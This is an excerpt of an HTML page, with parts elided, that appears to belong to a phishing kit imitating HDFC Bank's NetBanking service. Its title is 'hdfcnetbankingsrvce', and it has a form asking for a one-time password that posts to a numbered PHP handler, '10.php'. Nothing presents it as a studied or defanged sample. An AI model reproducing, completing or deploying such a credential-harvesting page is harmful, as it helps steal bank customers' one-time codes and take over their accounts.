...
<head>
    <meta charset="UTF-8">
    <title>hdfcnetbankingsrvce</title>
    
    <link rel="stylesheet" href="style.css">
    <style>
            html { height:150%; }
        body{ font: 26px sans-serif; }
        .wrapper{ width: 800px; padding: 110px; }
...
<header style= "background-image: url(2k.jpeg);
    background-attachment: fixed;
    background-repeat: no-repeat;
    background-size: contain;
    min-height: 200px;">                            
              <center> <img src="9.jpeg"/>
      </center>
...
<!--<div class="loader"></div>-->
        ...
        <form action="10.php" method="post">
            <div class="form-group">
                ...
                <input type="text" name="otp4" class="form-control " value="" placeholder="Enter otp">
